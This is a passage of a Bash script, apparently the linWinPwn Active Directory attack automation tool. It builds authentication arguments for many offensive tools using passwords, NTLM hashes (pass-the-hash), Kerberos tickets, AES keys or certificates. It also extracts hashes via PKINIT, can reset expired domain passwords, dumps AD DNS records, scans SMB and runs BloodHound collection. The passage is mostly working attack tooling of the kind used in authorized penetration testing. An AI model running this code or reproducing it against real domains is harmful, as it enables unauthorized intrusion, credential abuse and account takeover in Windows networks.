]; then\n            echo -e \"${RED}Invalid servers list.${NC} Choosing Domain Controllers as targets instead.\"\n            curr_targets=\"Domain Controllers\"\n            custom_ip=\"\"\n        fi\n    else\n        echo -e \"${RED}[-] Error invalid targets parameter. Choose between DC, All, File='./custom_list' or IP=IP_or_hostname... ${NC}\"\n        exit 1\n    fi\n}\n\nauthenticate() {\n    #Check if null session or empty password is used\n    if [ \"${pass_bool}\" == false ] && [ \"${hash_bool}\" == false ] && [ \"${kerb_bool}\" == false ] && [ \"${aeskey_bool}\" == false ] && [ \"${cert_bool}\" == false ]; then\n        if [ ! \"${user}\" == \"\" ]; then\n            echo -e \"${RED}[i]${NC} Please specify password, NTLM hash, Kerberos ticket, AES key or certificate and try again...\"\n            exit 1\n        else\n            nullsess_bool=true\n            rand_user=$(\n                tr -dc A-Za-z0-9 </dev/urandom | head -c 10\n                echo\n            )\n            argument_ne=\"-d ${domain} -u '' -p ''\"\n            argument_smbmap=\"-d ${domain} -u '' -p ''\"\n            argument_manspider=\"-d ${domain} -u '' -p ''\"\n            argument_coercer=\"-d ${domain} -u '' -p ''\"\n            argument_bloodyad=\"-d ${domain} -u '' -p ''\"\n            argument_privexchange=\"-d ${domain} -u '' -p ''\"\n            argument_windap=\"-d ${domain}\"\n            argument_adidns=\"\"\n            argument_ldd=\"\"\n            argument_silenthd=\"\"\n            argument_enum4linux=\"\"\n            argument_imp=\"${domain}/\"\n            argument_imp_gp=\"${domain}/\"\n            argument_ldeep=\"-d ${dc_domain} -a\"\n            argument_pre2k=\"-d ${domain}\"\n            argument_p0dalirius=\"-d ${domain} -u Guest -p ''\"\n            argument_FindUncom=\"-ad ${domain} -au Guest -ap ''\"\n            argument_adalanche=\"--authmode anonymous --username Guest\\\\@${domain} -p '!'\"\n            argument_godap=\"\"\n            auth_string=\"${YELLOW}[i]${NC} Authentication method: ${YELLOW}null session ${NC}\"\n        fi\n\n    #Check if username is not provided\n    elif [ \"${user}\" == \"\" ]; then\n        echo -e \"${RED}[i]${NC} Please specify username and try again...\"\n        exit 1\n    fi\n\n    #Check if password is used\n    if [ \"${pass_bool}\" == true ]; then\n        argument_ne=\"-d ${domain} -u '${user}' -p '${password}'\"\n        argument_imp=\"${domain}/'${user}':'${password}'\"\n        argument_imp_gp=\"${domain}/'${user}':'${password}'\"\n        argument_imp_ti=\"-user '${user}' -password '${password}' -domain ${domain}\"\n        argument_bhd=\"-u '${user}'\\\\@${domain} -p '${password}' --auth-method ntlm\"\n        argument_enum4linux=\"-w ${domain} -u '${user}' -p '${password}'\"\n        argument_adidns=\"-u ${domain}\\\\\\\\'${user}' -p '${password}'\"\n        argument_ldd=\"-u ${domain}\\\\\\\\'${user}' -p '${password}'\"\n        argument_smbmap=\"-d ${domain} -u '${user}' -p '${password}'\"\n        argument_certi_py=\"${domain}/'${user}':'${password}'\"\n        argument_certipy=\"-u '${user}'\\\\@${domain} -p '${password}'\"\n        argument_ldeep=\"-d ${domain} -u '${user}' -p '${password}'\"\n        argument_pre2k=\"-d ${domain} -u '${user}' -p '${password}'\"\n        argument_certsync=\"-d ${domain} -u '${user}' -p '${password}'\"\n        argument_donpapi=\"-d ${domain} -u '${user}' -p '${password}'\"\n        argument_hekatomb=\"${domain}/'${user}':'${password}'\"\n        argument_silenthd=\"-u ${domain}\\\\\\\\'${user}' -p '${password}'\"\n        argument_windap=\"-d ${domain} -u '${user}' -p '${password}'\"\n        argument_targkerb=\"-d ${domain} -u '${user}' -p '${password}'\"\n        argument_p0dalirius=\"-d ${domain} -u '${user}' -p '${password}'\"\n        argument_FindUncom=\"-ad ${domain} -au '${user}' -ap '${password}'\"\n        argument_manspider=\"-d ${domain} -u '${user}' -p '${password}'\"\n        argument_coercer=\"-d ${domain} -u '${user}' -p '${password}'\"\n        argument_bloodyad=\"-d ${domain} -u '${user}' -p '${password}'\"\n        argument_aced=\"${domain}/'${user}':'${password}'\"\n        argument_sccm=\"-d ${domain} -u '${user}' -p '${password}'\"\n        argument_ldapper=\"-D ${domain} -U '${user}' -P '${password}'\"\n        argument_adalanche=\"--authmode ntlm --username '${user}'\\\\@${domain} --password '${password}'\"\n        argument_mssqlrelay=\"-u '${user}'\\\\@${domain} -p '${password}'\"\n        argument_pygpoabuse=\"${domain}/'${user}':'${password}''\"\n        argument_GPOwned=\"-d ${domain} -u '${user}' -p '${password}'\"\n        argument_privexchange=\"-d ${domain} -u '${user}' -p '${password}'\"\n        argument_adpeas=\"-d ${domain} -u '${user}' -p '${password}'\"\n        argument_adcheck=\"-d ${domain} -u '${user}' -p '${password}'\"\n        argument_evilwinrm=\"-u '${user}' -p '${password}'\"\n        argument_godap=\"-u '${user}'@${domain} -p '${password}'\"\n        argument_mssqlpwner=\"${domain}/'${user}':'${password}'\"\n        hash_bool=false\n        kerb_bool=false\n        unset KRB5CCNAME\n        aeskey_bool=false\n        cert_bool=false\n        auth_string=\"${YELLOW}[i]${NC} Authentication method: ${YELLOW}password of ${user}${NC}\"\n    fi\n\n    #Check if NTLM hash is used, and complete with empty LM hash / Check if Certificate is provided for PKINIT\n    if [ \"${hash_bool}\" == true ] || [ \"${cert_bool}\" == true ]; then\n        if [ \"${cert_bool}\" == true ]; then\n            echo -e \"${YELLOW}[!]${NC} WARNING only ldeep and bloodyAD currently support certificate authentication.${NC}\"\n            echo -e \"${YELLOW}[!]${NC} Extracting the NTLM hash of the user using PKINIT and using PtH for all other tools${NC}\"\n            pkinit_auth\n            $(which openssl) pkcs12 -in \"${pfxcert}\" -out \"${output_dir}/Credentials/${user}.pem\" -nodes -passin pass:\"\"\n            if [ -f \"${output_dir}/Credentials/${user}.pem\" ]; then\n                pem_cert=\"${output_dir}/Credentials/${user}.pem\"\n                echo -e \"${GREEN}[+] PFX Certificate converted to PEM successfully:${NC} '${output_dir}/Credentials/${user}.pem'\"\n            fi\n            argument_bloodyad=\"-d ${domain} -u '${user}' -c ':${pem_cert}'\"\n            argument_ldeep=\"-d ${domain} -u '${user}' --pfx-file '${pfxcert}'\"\n            argument_evilwinrm=\"-u '${user}' -k '${pem_cert}'\"\n            auth_string=\"${YELLOW}[i]${NC} Authentication method: ${YELLOW}Certificate of $user located at $(realpath \"$pfxcert\")${NC}\"\n            hash_bool=true\n        else\n            if [[ (${#hash} -eq 65 && \"${hash:32:1}\" == \":\") || (${#hash} -eq 33 && \"${hash:0:1}\" == \":\") || (${#hash} -eq 32) ]]; then\n                if [ \"$(echo \"$hash\" | grep ':')\" == \"\" ]; then\n                    hash=\":\"$hash\n                fi\n                if [ \"$(echo \"$hash\" | cut -d \":\" -f 1)\" == \"\" ]; then\n                    hash=\"aad3b435b51404eeaad3b435b51404ee\"$hash\n                fi\n                argument_ne=\"-d ${domain} -u '${user}' -H ${hash}\"\n                argument_imp=\" -hashes ${hash} ${domain}/'${user}'\"\n                argument_imp_gp=\" -hashes ${hash} ${domain}/'${user}'\"\n                argument_imp_ti=\"-user '${user}' -hashes ${hash} -domain ${domain}\"\n                argument_bhd=\"-u '${user}'\\\\@${domain} --hashes ${hash} --auth-method ntlm\"\n                argument_enum4linux=\"-w ${domain} -u '${user}' -H ${hash:33}\"\n                argument_adidns=\"-u ${domain}\\\\\\\\'${user}' -p ${hash}\"\n                argument_ldd=\"-u ${domain}\\\\\\\\'${user}' -p ${hash}\"\n                argument_smbmap=\"-d ${domain} -u '${user}' -p ${hash}\"\n                argument_certi_py=\"${domain}/'${user}' --hashes ${hash}\"\n                argument_certipy=\"-u '${user}'\\\\@${domain} -hashes ${hash}\"\n                argument_pre2k=\"-d ${domain} -u '${user}' -hashes ${hash}\"\n                argument_certsync=\"-d ${domain} -u '${user}' -hashes ${hash}\"\n                argument_donpapi=\"-H ${hash} -d ${domain} -u '${user}'\"\n                argument_hekatomb=\"-hashes ${hash} ${domain}/'${user}'\"\n                argument_silenthd=\"-u ${domain}\\\\\\\\'${user}' --hashes ${hash}\"\n                argument_windap=\"-d ${domain} -u '${user}' --hash ${hash}\"\n                argument_targkerb=\"-d ${domain} -u '${user}' -H ${hash}\"\n                argument_p0dalirius=\"-d ${domain} -u '${user}' -H ${hash:33})\"\n                argument_FindUncom=\"-ad ${domain} -au '${user}' -ah ${hash}\"\n                argument_manspider=\"-d ${domain} -u '${user}' -H ${hash:33}\"\n                argument_coercer=\"-d ${domain} -u '${user}' --hashes ${hash}\"\n                argument_aced=\" -hashes ${hash} ${domain}/'${user}'\"\n                argument_sccm=\"-d ${domain} -u '${user}' -hashes ${hash}\"\n                argument_ldapper=\"-D ${domain} -U '${user}' -P ${hash}\"\n                argument_ldeep=\"-d ${domain} -u '${user}' -H ${hash}\"\n                argument_bloodyad=\"-d ${domain} -u '${user}' -p ${hash}\"\n                argument_adalanche=\"--authmode ntlmpth --username '${user}'\\\\@${domain} --password ${hash}\"\n                argument_mssqlrelay=\"-u '${user}'\\\\@${domain} -hashes ${hash}\"\n                argument_pygpoabuse=\" -hashes ${hash} ${domain}/'${user}'\"\n                argument_GPOwned=\"-d ${domain} -u '${user}' -hashes ${hash}\"\n                argument_privexchange=\"-d ${domain} -u '${user}' --hashes ${hash}\"\n                argument_adcheck=\"-d ${domain} -u '${user}' -H ${hash}\"\n                argument_evilwinrm=\"-u '${user}' -H ${hash:33}\"\n                argument_godap=\"-u '${user}' -d ${domain} -H ${hash}\"\n                argument_mssqlpwner=\"-hashes ${hash} ${domain}/'${user}'\"\n                auth_string=\"${YELLOW}[i]${NC} Authentication method: ${YELLOW}NTLM hash of '${user}'${NC}\"\n            else\n                echo -e \"${RED}[i]${NC} Incorrect format of NTLM hash...\"\n                exit 1\n            fi\n        fi\n        pass_bool=false\n        kerb_bool=false\n        unset KRB5CCNAME\n        aeskey_bool=false\n    fi\n\n    #Check if kerberos ticket is used\n    if [ \"${kerb_bool}\" == true ]; then\n        argument_ne=\"-d ${domain} -u '${user}' --use-kcache\"\n        pass_bool=false\n        hash_bool=false\n        aeskey_bool=false\n        cert_bool=false\n        forcekerb_bool=false\n        if [ -f \"${krb5cc}\" ]; then\n            target=${dc_FQDN}\n            target_dc=${dc_hostname_list}\n            target_sql=${sql_hostname_list}\n            target_servers=${servers_hostname_list}\n            krb5cc_path=$(realpath \"$krb5cc\")\n            export KRB5CCNAME=$krb5cc_path\n            argument_imp=\"-k -no-pass ${domain}/'${user}'\"\n            argument_enum4linux=\"-w ${domain} -u '${user}' -K ${krb5cc}\"\n            argument_bhd=\"-u '${user}'\\\\@${domain} -k -no-pass -p '' --auth-method kerberos\"\n            argument_certi_py=\"${domain}/'${user}' -k --no-pass\"\n            argument_certipy=\"-u '${user}'\\\\@${domain} -k -no-pass -target ${dc_FQDN}\"\n            argument_ldeep=\"-d ${domain} -u '${user}' -k\"\n            argument_pre2k=\"-d ${domain} -u '${user}' -k -no-pass\"\n            argument_certsync=\"-d ${domain} -u '${user}' -use-kcache -no-pass -k\"\n            argument_donpapi=\"-k --no-pass -d ${domain} -u '${user}'\"\n            argument_targkerb=\"-d ${domain} -u '${user}' -k --no-pass\"\n            argument_p0dalirius=\"-d ${domain} -u '${user}' -k --no-pass\"\n            argument_FindUncom=\"-ad ${domain} -au '${user}' -k --no-pass\"\n            argument_bloodyad=\"-d ${domain} -u '${user}' -k\"\n            argument_adalanche=\"--authmode kerberoscache --username '${user}'\\\\@${domain}\"\n            argument_aced=\"-k -no-pass ${domain}/'${user}'\"\n            argument_sccm=\"-d ${domain} -u '${user}' -k -no-pass\"\n            argument_mssqlrelay=\"-u '${user}'\\\\@${domain} -k -no-pass -target ${target}\"\n            argument_pygpoabuse=\"${domain}/'${user}' -k -ccache $(realpath \"$krb5cc\")\"\n            argument_GPOwned=\"-d ${domain} -u '${user}' -k -no-pass\"\n            argument_evilwinrm=\"-r ${domain} -u '${user}'\"\n            argument_godap=\"-d ${domain} -k -t ldap/${target}\"\n            argument_mssqlpwner=\" -k -no-pass ${domain}/'${user}'\"\n            auth_string=\"${YELLOW}[i]${NC} Authentication method: ${YELLOW}Kerberos Ticket of $user located at $(realpath \"$krb5cc\")${NC}\"\n        else\n            echo -e \"${RED}[i]${NC} Error accessing provided Kerberos ticket $(realpath \"$krb5cc\")...\"\n            exit 1\n        fi\n    fi\n\n    #Check if kerberos AES key is used\n    if [ \"${aeskey_bool}\" == true ]; then\n        target=${dc_FQDN}\n        target_dc=${dc_hostname_list}\n        target_sql=${sql_hostname_list}\n        target_servers=${servers_hostname_list}\n        argument_ne=\"-d ${domain} -u '${user}' --aesKey ${aeskey}\"\n        argument_imp=\"-aesKey ${aeskey} ${domain}/'${user}'\"\n        argument_bhd=\"-u '${user}'\\\\@${domain} -aesKey ${aeskey} --auth-method kerberos\"\n        argument_certi_py=\"${domain}/'${user}' --aes ${aeskey} -k\"\n        argument_certipy=\"-u '${user}'\\\\@${domain} -aes ${aeskey} -target ${dc_FQDN}\"\n        argument_pre2k=\"-d ${domain} -u '${user}' -aes ${aeskey} -k\"\n        argument_certsync=\"-d ${domain} -u '${user}' -aesKey ${aeskey} -k\"\n        argument_donpapi=\"-k --aesKey ${aeskey} -d ${domain} -u '${user}'\"\n        argument_targkerb=\"-d ${domain} -u '${user}' --aes-key ${aeskey} -k\"\n        argument_p0dalirius=\"-d ${domain} -u '${user}' --aes-key ${aeskey} -k\"\n        argument_FindUncom=\"-ad ${domain} -au '${user}' --aes-key ${aeskey} -k\"\n        argument_aced=\"-aes ${aeskey} ${domain}/'${user}'\"\n        argument_sccm=\"-d ${domain} -u '${user}' -aes ${aeskey}\"\n        argument_mssqlrelay=\"-u '${user}'\\\\@${domain} -aes ${aeskey} -k\"\n        argument_GPOwned=\"-d ${domain} -u '${user}' -aesKey ${aeskey} -k\"\n        argument_mssqlpwner=\"${domain}/'${user}' -aesKey ${aeskey} -k\"\n        pass_bool=false\n        hash_bool=false\n        kerb_bool=false\n        unset KRB5CCNAME\n        cert_bool=false\n        forcekerb_bool=false\n        auth_string=\"${YELLOW}[i]${NC} Authentication method: ${YELLOW}AES Kerberos key of ${user}${NC}\"\n    fi\n\n    if [ \"${forcekerb_bool}\" == true ]; then\n        argument_ne=\"${argument_ne} -k\"\n        target=${dc_FQDN}\n        target_dc=${dc_hostname_list}\n        target_sql=${sql_hostname_list}\n        target_servers=${servers_hostname_list}\n    fi\n\n    #Perform authentication using provided credentials\n    if [ \"${nullsess_bool}\" == false ]; then\n        auth_check=$(run_command \"${netexec} smb ${target} ${argument_ne}\" 2>&1 | grep -v \" Error checking if user is admin on \"|  grep \"\\[-\\]\\|Traceback\" -A 10 2>&1)\n        if [ -n \"$auth_check\" ]; then\n            echo \"$auth_check\"\n            if [[ $auth_check == *\"STATUS_NOT_SUPPORTED\"* ]]; then\n                echo -e \"${BLUE}[*] Domain does not support NTLM authentication. Attempting to generate TGT ticket to use Kerberos instead..${NC}\"\n                if [ ! -f \"${impacket_getTGT}\" ]; then\n                    echo -e \"${RED}[-] getTGT.py not found! Please verify the installation of impacket${NC}\"\n                else\n                    if [ \"${pass_bool}\" == true ] || [ \"${hash_bool}\" == true ] || [ \"${aeskey_bool}\" == true ]; then\n                        current_dir=$(pwd)\n                        cd \"${output_dir}/Credentials\" || exit\n                        echo -e \"${CYAN}[*] Requesting TGT for current user${NC}\"\n                        run_command \"${impacket_getTGT} ${argument_imp} -dc-ip ${dc_ip}\" | grep -v \"Impacket\" | sed '/^$/d' | tee \"${output_dir}/Credentials/getTGT_output_${dc_domain}\"\n                        cd \"${current_dir}\" || exit\n                        if [ -f \"${output_dir}/Credentials/${user}.ccache\" ]; then\n                            krb_ticket=\"${output_dir}/Credentials/${user}.ccache\"\n                            echo -e \"${GREEN}[+] TGT generated successfully:${NC} '$krb_ticket'\"\n                            echo -e \"${GREEN}[+] Re-run linWinPwn to use ticket instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u '${user}' -K '${krb_ticket}'\"\n                            exit 1\n                        else\n                            echo -e \"${RED}[-] Failed to generate TGT${NC}\"\n                        fi\n                    else\n                        echo -e \"${RED}[-] Error! Requires password, NTLM hash or AES key...${NC}\"\n                    fi\n                fi\n            fi\n            if [[ $auth_check == *\"STATUS_PASSWORD_MUST_CHANGE\"* ]] || [[ $auth_check == *\"STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT\"* ]]; then\n                if [ ! -f \"${impacket_changepasswd}\" ]; then\n                    echo -e \"${RED}[-] changepasswd.py not found! Please verify the installation of impacket${NC}\"\n                elif [ \"${kerb_bool}\" == true ] || [ \"${aeskey_bool}\" == true ]; then\n                    echo -e \"${PURPLE}[-] changepasswd does not support Kerberos authentication${NC}\"\n                else\n                    pass_passchange=\"\"\n                    if [[ $auth_check == *\"STATUS_PASSWORD_MUST_CHANGE\"* ]]; then\n                        echo -e \"${BLUE}[*] Changing expired password of own user. Please specify new password (default: Summer3000_):${NC}\"\n                        read -rp \">> \" pass_passchange </dev/tty\n                        if [[ ${pass_passchange} == \"\" ]]; then pass_passchange=\"Summer3000_\"; fi\n                        echo -e \"${CYAN}[*] Changing password of ${user} to ${pass_passchange}${NC}\"\n                        run_command \"${impacket_changepasswd} ${argument_imp}\\\\@${dc_ip} -newpass ${pass_passchange}\" | tee -a \"${output_dir}/Modification/impacket_changepasswd_${dc_domain}.txt\"\n                    elif [[ $auth_check == *\"STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT\"* ]]; then\n                        echo -e \"${BLUE}[*] Changing password of pre created computer account. Please specify new password (default: Summer3000_):${NC}\"\n                        read -rp \">> \" pass_passchange </dev/tty\n                        if [[ ${pass_passchange} == \"\" ]]; then pass_passchange=\"Summer3000_\"; fi\n                        authuser_passchange=\"\"\n                        echo -e \"${BLUE}[*] Please specify username for RPC authentication:${NC}\"\n                        echo -e \"${CYAN}[*] Example: user01 ${NC}\"\n                        read -rp \">> \" authuser_passchange </dev/tty\n                        while [ \"${pass_passchange}\" == \"\" ]; do\n                            echo -e \"${RED}Invalid username.${NC} Please specify username:\"\n                            read -rp \">> \" authuser_passchange </dev/tty\n                        done\n                        authpass_passchange=\"\"\n                        echo -e \"${BLUE}[*] Please specify password for RPC authentication:${NC}\"\n                        read -rp \">> \" authpass_passchange </dev/tty\n                        while [ \"${pass_passchange}\" == \"\" ]; do\n                            echo -e \"${RED}Invalid password.${NC} Please specify password:\"\n                            read -rp \">> \" authpass_passchange </dev/tty\n                        done\n                        echo -e \"${CYAN}[*] Changing password of ${user} to ${pass_passchange}${NC}\"\n                        run_command \"${impacket_changepasswd} ${argument_imp}\\\\@${dc_ip} -newpass ${pass_passchange} -altuser ${authuser_passchange} -altpass ${authpass_passchange}\" | tee -a \"${output_dir}/Modification/impacket_changepasswd_${dc_domain}.txt\"\n                    fi\n                    password=\"${pass_passchange}\"\n                    auth_check=\"\"\n                    authenticate\n                fi\n                echo -e \"\"\n            fi\n            echo -e \"${RED}[-] Error authenticating to domain! Please check your credentials and try again... ${NC}\"\n            exit 1\n        fi\n    fi\n\n    if [ \"${verbose_bool}\" == true ]; then\n        ne_verbose=\"--verbose\"\n        argument_imp=\"-debug ${argument_imp}\"\n        argument_imp_gp=\"-debug ${argument_imp_gp}\"\n        argument_imp_ti=\"-debug ${argument_imp_ti}\"\n        argument_enum4linux=\"${argument_enum4linux} -v\"\n        argument_bhd=\"${argument_bhd} -v\"\n        argument_adidns=\"${argument_adidns} -v -d\"\n        argument_pre2k=\"${argument_pre2k} -verbose\"\n        argument_certsync=\"${argument_certsync} -debug\"\n        argument_hekatomb=\"-debug ${argument_hekatomb}\"\n        argument_windap=\"${argument_windap} -v --debug\"\n        argument_targkerb=\"${argument_targkerb} -v\"\n        argument_kerbrute=\"-v\"\n        argument_manspider=\"${argument_manspider} -v\"\n        argument_coercer=\"${argument_coercer} -v\"\n        argument_CVE202233679=\"-debug\"\n        argument_bloodyad=\"-v DEBUG ${argument_bloodyad}\"\n        argument_aced=\"-debug ${argument_aced}\"\n        argument_sccm=\"-debug ${argument_sccm}\"\n        mssqlrelay_verbose=\"-debug\"\n        adalanche_verbose=\"--loglevel Debug\"\n        argument_pygpoabuse=\"${argument_pygpoabuse} -vv\"\n        argument_privexchange=\"${argument_privexchange} --debug\"\n        argument_adcheck=\"${argument_adcheck} --debug\"\n        argument_mssqlpwner=\"-debug ${argument_mssqlpwner}\"\n    fi\n\n    echo -e \"${auth_string}\"\n}\n\nparse_servers() {\n    sed -e 's/ //' -e 's/\\$//' -e 's/.*/\\U&/' \"${output_dir}\"/DomainRecon/Servers/servers_list_*_\"${dc_domain}.txt\" 2>/dev/null | sort -uf >\"${servers_hostname_list}\" 2>&1\n    sed -e 's/ //' -e 's/\\$//' -e 's/.*/\\U&/' \"${output_dir}\"/DomainRecon/Servers/dc_list_*_\"${dc_domain}.txt\" 2>/dev/null  | sort -uf >\"${dc_hostname_list}\" 2>&1\n    sort -uf <(sort -uf \"${output_dir}\"/DomainRecon/Servers/ip_list_*_\"${dc_domain}.txt\" 2>/dev/null) >\"${servers_ip_list}\"\n    sort -uf <(sort -uf \"${output_dir}\"/DomainRecon/Servers/dc_ip_list_*_\"${dc_domain}.txt\" 2>/dev/null) >\"${dc_ip_list}\"\n\n    if ! grep -q \"${dc_ip}\" \"${servers_ip_list}\" 2>/dev/null; then echo \"${dc_ip}\" >>\"${servers_ip_list}\"; fi\n    if ! grep -q \"${dc_ip}\" \"${dc_ip_list}\" 2>/dev/null; then echo \"${dc_ip}\" >>\"${dc_ip_list}\"; fi\n    if ! grep -q \"${dc_FQDN^^}\" \"${dc_hostname_list}\" 2>/dev/null; then echo \"${dc_FQDN,,}\" >>\"${dc_hostname_list}\"; fi\n    if ! grep -q \"${dc_FQDN^^}\" \"${servers_hostname_list}\" 2>/dev/null; then echo \"${dc_FQDN,,}\" >>\"${servers_hostname_list}\"; fi\n}\n\nparse_users() {\n    users_list=\"${output_dir}/DomainRecon/Users/users_list_${dc_domain}.txt\"\n    sort -uf <(sort -uf \"${output_dir}\"/DomainRecon/Users/users_list_*_\"${dc_domain}.txt\" 2>/dev/null) >\"${users_list}\"\n\n    if [[ ! \"${user}\" == \"\" ]] && ! grep -q \"${user}\" \"${users_list}\" 2>/dev/null; then echo \"${user}\" >>\"${users_list}\"; fi\n}\n\ndns_enum() {\n    if [ ! -f \"${adidnsdump}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of adidnsdump${NC}\"\n        echo -e \"\"\n    else\n        echo -e \"${BLUE}[*] DNS dump using adidnsdump${NC}\"\n        dns_records=\"${output_dir}/DomainRecon/dns_records_${dc_domain}.csv\"\n        if [ ! -f \"${dns_records}\" ]; then\n            if [ \"${kerb_bool}\" == true ] || [ \"${aeskey_bool}\" == true ]; then\n                echo -e \"${PURPLE}[-] adidnsdump does not support Kerberos authentication${NC}\"\n            else\n                if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"--ssl\"; else ldaps_param=\"\"; fi\n                run_command \"${adidnsdump} ${argument_adidns} ${ldaps_param} --dns-tcp ${dc_ip}\" | tee \"${output_dir}/DomainRecon/adidnsdump_output_${dc_domain}.txt\"\n                mv records.csv \"${output_dir}/DomainRecon/dns_records_${dc_domain}.csv\" 2>/dev/null\n                grep \"A,\" \"${output_dir}/DomainRecon/dns_records_${dc_domain}.csv\" 2>/dev/null | grep -v \"DnsZones\\|@\" | cut -d \",\" -f 2 | sort -u | grep \"\\S\" | sed -e \"s/$/.${dc_domain}/\" >\"${output_dir}/DomainRecon/Servers/servers_list_dns_${dc_domain}.txt\"\n                grep \"A,\" \"${output_dir}/DomainRecon/dns_records_${dc_domain}.csv\" 2>/dev/null | grep -v \"DnsZones\\|@\" | cut -d \",\" -f 3 >\"${output_dir}/DomainRecon/Servers/ip_list_dns_${dc_domain}.txt\"\n                grep \"@\" \"${output_dir}/DomainRecon/dns_records_${dc_domain}.csv\" 2>/dev/null | grep \"NS,\" | cut -d \",\" -f 3 | sed 's/\\.$//' >\"${output_dir}/DomainRecon/Servers/dc_list_dns_${dc_domain}.txt\"\n                grep \"@\" \"${output_dir}/DomainRecon/dns_records_${dc_domain}.csv\" 2>/dev/null | grep \"A,\" | cut -d \",\" -f 3 >\"${output_dir}/DomainRecon/Servers/dc_ip_list_dns_${dc_domain}.txt\"\n            fi\n            parse_servers\n        else\n            parse_servers\n            echo -e \"${YELLOW}[i] DNS dump found ${NC}\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nsmb_scan() {\n    if [ ! -f \"${nmap}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of nmap ${NC}\"\n    else\n        if [ \"${curr_targets}\" == \"Domain Controllers\" ]; then\n            servers_smb_list=${target_dc}\n        elif [ \"${curr_targets}\" == \"All domain servers\" ]; then\n            servers_scan_list=${target_servers}\n            echo -e \"${YELLOW}[i] Scanning all domain servers ${NC}\"\n            servers_smb_list=\"${output_dir}/Scans/servers_all_smb_${dc_domain}.txt\"\n            if [ ! -f \"${servers_smb_list}\" ]; then\n                run_command \"${nmap} -p 445 -Pn -sT -n -iL ${servers_scan_list} -oG ${output_dir}/Scans/nmap_smb_scan_all_${dc_domain}.txt\" 1>/dev/null 2>&1\n                grep -a \"open\" \"${output_dir}/Scans/nmap_smb_scan_all_${dc_domain}.txt\" 2>/dev/null | cut -d \" \" -f 2 >\"${servers_smb_list}\"\n            else\n                echo -e \"${YELLOW}[i] SMB nmap scan results found ${NC}\"\n            fi\n        elif [ \"${curr_targets}\" == \"File containing list of servers\" ]; then\n            servers_scan_list=${custom_servers_list}\n            echo -e \"${YELLOW}[i] Scanning servers in ${custom_servers} ${NC}\"\n            servers_smb_list=\"${output_dir}/Scans/servers_custom_smb_${dc_domain}.txt\"\n            if [ \"${custom_target_scanned}\" == false ]; then\n                run_command \"${nmap} -p 445 -Pn -sT -n -iL ${servers_scan_list} -oG ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt\" 1>/dev/null 2>&1\n                grep -a \"open\" \"${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt\" 2>/dev/null | cut -d \" \" -f 2 >\"${servers_smb_list}\"\n                custom_target_scanned=true\n            else\n                echo -e \"${YELLOW}[i] SMB nmap scan results found ${NC}\"\n            fi\n        elif [ \"${curr_targets}\" == \"IP or hostname\" ]; then\n            servers_scan_list=$(head -n1 \"${custom_servers_list}\")\n            echo -e \"${YELLOW}[i] Scanning server ${custom_ip}${NC}\"\n            servers_smb_list=\"${output_dir}/Scans/servers_custom_smb_${dc_domain}.txt\"\n            if [ \"${custom_target_scanned}\" == false ]; then\n                run_command \"${nmap} -p 445 -Pn -sT -n ${servers_scan_list} -oG ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt\" 1>/dev/null 2>&1\n                grep -a \"open\" \"${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt\" 2>/dev/null | cut -d \" \" -f 2 >\"${servers_smb_list}\"\n                custom_target_scanned=true\n            else\n                echo -e \"${YELLOW}[i] SMB nmap scan results found ${NC}\"\n            fi\n        fi\n    fi\n}\n\n###### ad_enum: AD Enumeration\nbhd_enum() {\n    if [ ! -f \"${bloodhound}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of bloodhound${NC}\"\n    else\n        mkdir -p \"${output_dir}/DomainRecon/BloodHound\"\n        echo -e \"${BLUE}[*] BloodHound Enumeration using all collection methods (Noisy!)${NC}\"\n        if [ -n \"$(find \"${output_dir}/DomainRecon/BloodHound/\" -type f -name '*.json' -print -quit)\" ]; then\n            echo -e \"${YELLOW}[i] BloodHound results found, skipping... ${NC}\"\n        else\n            if [ \"${nullsess_bool}\" == true ]; then\n                echo -e \"${PURPLE}[-] BloodHound requires credentials${NC}\"\n            else\n                current_dir=$(pwd)\n                cd \"${output_dir}/DomainRecon/BloodHound\" || exit\n                if [ \"${ldapbinding_bool}\" == true ]; then ldapbinding_param=\"--ldap-channel-binding\"; else ldapbinding_param=\"\"; fi\n                if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"--use-ldaps ${ldapbinding_param}\"; else ldaps_param=\"\"; fi\n                run_command \"${bloodhound} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 5 --dns-tcp -dc ${dc_FQDN} ${ldaps_param}\" | tee \"${output_dir}/DomainRecon/BloodHound/bloodhound_output_${dc_domain}.txt\"\n                cd \"${current_dir}\" || exit\n                #run_command \"${netexec} ${ne_verbose} ldap ${ne_kerb} ${target} ${argument_ne} --bloodhound --dns-server ${dc_ip} -c All --log ${output_dir}/DomainRecon/BloodHound/ne_bloodhound_output_${dc_domain}.txt\" 2>&1\n                /usr/bin/jq -r \".data[].Properties.samaccountname| select( . != null )\" \"${output_dir}\"/DomainRecon/BloodHound/*_users.json 2>/dev/null >\"${output_dir}/DomainRecon/Users/users_list_bhd_${dc_domain}.txt\"\n                /usr/bin/jq -r \".data[].Properties.name| select( . != null )\" \"${output_dir}\"/DomainRecon/BloodHound/*_computers.json 2>/dev/null >\"${output_dir}/DomainRecon/Servers/servers_list_bhd_${dc_domain}.txt\"\n                /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains(\"MSSQL\")).serviceprincipalnames[]' \"${output_dir}\"/DomainRecon/BloodHound/*_users.json 2>/dev/null | cut -d \"/\" -f 2 | cut -d \":\" -f 1 | sort -u >\"${output_dir}/DomainRecon/Servers/sql_list_bhd_${dc_domain}.txt\"\n                parse_users\n                parse_servers\n            fi\n        fi\n    fi\n    echo -e \"\"\n}\n\nbhd_enum_dconly() {\n    if [ ! -f \"${bloodhound}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of bloodhound${NC}\"\n    else\n        mkdir -p \"${output_dir}/DomainRecon/BloodHound\"\n        echo -e \"${BLUE}[*] BloodHound 